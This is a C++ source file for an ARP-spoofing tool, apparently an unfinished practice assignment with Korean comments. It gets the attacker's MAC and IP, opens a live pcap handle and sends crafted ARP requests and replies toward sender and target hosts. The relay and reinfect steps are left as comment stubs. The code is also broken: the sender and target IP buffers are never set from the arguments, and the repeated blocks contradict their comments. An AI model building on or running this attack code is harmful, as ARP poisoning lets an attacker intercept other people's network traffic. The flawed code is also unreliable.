#include "packet.h"
#include "get_address.h"
#include "ip.h"

#define MAC_ADDR_LEN 6 
using namespace std; 


void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2");
}

int main(int argc, char* argv[]){

    if ( argc % 2 != 0 ){
        usage();
        return -1;
    }


    // ======================== 초기설정 =============================
    char attacker_mac[MAC_ADDR_LEN  * 3 + 1] = {0,};
    char sender_mac[MAC_ADDR_LEN  * 3 + 1] = {0,};
    char target_mac[MAC_ADDR_LEN  * 3 + 1] = {0,};
    char broad_mac[] = "ff:ff:ff:ff:ff:ff"; 
    char empty_mac[MAC_ADDR_LEN  * 3 + 1] = {0,};

    char sender_ip[INET_ADDRSTRLEN];
    char target_ip[INET_ADDRSTRLEN];
    char attacker_ip[INET_ADDRSTRLEN];

    char *interface = argv[1];

    // =================== Get attacker mac, ip address ==========================
    
    uint8_t attacker_mac_temp[6];
    get_mac_address(string(argv[1]), attacker_mac_temp);
    to_hex_string(attacker_mac_temp, MAC_ADDR_LEN, attacker_mac);

    cout << "atacker mac 주소 "<< attacker_mac << endl;

    get_ip_address(interface, attacker_ip);
    std::cout << "attacker ip 주소" << "IP Address: " << attacker_ip << std::endl;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface,BUFSIZ,1,1,errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return -1;
	}    

    
    // sender_mac 주소 알아오기 
    request(handle,interface,broad_mac,attacker_mac,attacker_ip,empty_mac,target_ip,"request"); // target_mac 주소 알아오기 
    reply(handle, interface, target_mac, target_ip);
    
    // target_mac 주소 알아오기 
    request(handle,interface,broad_mac,attacker_mac,attacker_ip,empty_mac,target_ip, "request");// sender_mac 주소 알아오기 
    reply(handle, interface, target_mac, target_ip); 

    // target_mac 주소 알아오기 
    request(handle,interface,broad_mac,attacker_mac,attacker_ip,empty_mac,target_ip, "reply");// gateway_mac request (attacekr -> gateway)
    reply(handle, interface, target_mac, target_ip); 

    // target_mac 주소 알아오기 
    request(handle,interface,broad_mac,attacker_mac,attacker_ip,empty_mac,target_ip, "reply");// gateway_mac request (attacekr -> gateway)
    reply(handle, interface, target_mac, target_ip); 



    // reply()

    // relay()
    // reinfect()




}

    

